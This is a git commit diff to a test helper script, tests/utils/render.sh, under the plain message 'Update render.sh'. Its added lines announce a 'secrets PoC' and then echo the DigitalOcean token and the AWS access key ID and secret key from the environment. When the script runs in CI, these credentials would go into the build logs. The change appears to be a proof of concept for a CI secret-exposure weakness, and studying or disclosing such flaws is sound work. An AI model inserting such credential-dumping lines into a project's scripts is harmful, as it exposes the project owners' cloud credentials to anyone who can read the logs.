50fc484a0f505f97bcac217c700bf7bc7a0ad9b7
Arshad Kazmi <arshadkazmi42@gmail.com>
2024-12-09 15:39:25 +0100

    Update render.sh
    Signed-off-by: Arshad Kazmi <arshadkazmi42@gmail.com>

--- tests/utils/render.sh
+++ tests/utils/render.sh
@@ -5,6 +5,11 @@ set -o pipefail
 set -u
 
 function main() {
+  echo "Printing secrets PoC"
+  echo "DigitalOcean Token: $DIGITALOCEAN_TOKEN"
+	echo "Aws key id: $AWS_ACCESS_KEY_ID"
+	echo "Aws secret key: $AWS_SECRET_ACCESS_KEY"
+ 
   local template
   template="$1"
   shift
